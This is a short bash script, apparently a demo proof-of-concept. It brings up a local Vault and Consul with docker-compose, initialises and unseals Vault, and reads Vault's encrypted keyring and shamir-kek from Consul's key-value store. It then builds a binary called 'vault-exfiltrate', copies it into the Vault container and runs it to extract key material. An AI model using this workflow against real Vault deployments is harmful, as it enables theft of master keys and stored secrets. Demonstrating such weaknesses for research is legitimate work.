#!/bin/bash
# set -o errexit
# set -o pipefail
# set -o nounset

function checkCommandsAvailable() {
  for var in "$@"
  do
    if ! [ -x "$(command -v "$var")" ]; then
      echo "🔥 ${var} is not installed." >&2
      exit 1
    else
      echo "🏄 $var is installed..."
    fi
  done
}

checkCommandsAvailable docker go docker-compose jq vault consul

echo "This is a script for demoing purproses to get keyshares out of a vault"

docker-compose up -d
echo "sleep for 15"

sleep 15

export VAULT_ADDR=http://127.0.0.1:8200 
export CONSUL_HTTP_ADDR=http://127.0.0.1:8500 

echo "Vault status:"
vault status
echo "starting"
vault operator init -key-shares=1 -key-threshold=1 -format=json > cluster-keys.json
cat cluster-keys.json | jq -r ".unseal_keys_b64[]"
VAULT_UNSEAL_KEY=$(cat cluster-keys.json | jq -r ".unseal_keys_b64[]")
vault operator unseal $VAULT_UNSEAL_KEY
echo "Obtaining root token"
jq .root_token cluster-keys.json > commentedroottoken
sed "s/^\([\"']\)\(.*\)\1\$/\2/g" commentedroottoken > root_token
VAULT_TOKEN=$(cat root_token)
vault operator seal
vault operator unseal $VAULT_UNSEAL_KEY


echo "use consul to get keyring"
consul members
consul kv get -base64 vault/core/keyring | base64 -d > keyring_file
docker cp keyring_file vault:/keyring_file
consul kv get -base64 vault/core/shamir-kek >shamir-kek.b64
cat shamir-kek.b64 | base64 -d > shamir-kek-decoded
docker cp shamir-kek-decoded vault:/shamir-kek-decoded

echo "preparing payload to get data"
go mod vendor
GOOS=linux go build
docker cp vault-exfiltrate vault:/vault-exfiltrate 
docker cp exec.sh vault:/exec.sh

echo "Execute first exfiltration command"
docker exec -i  vault /bin/sh -C ./exec.sh

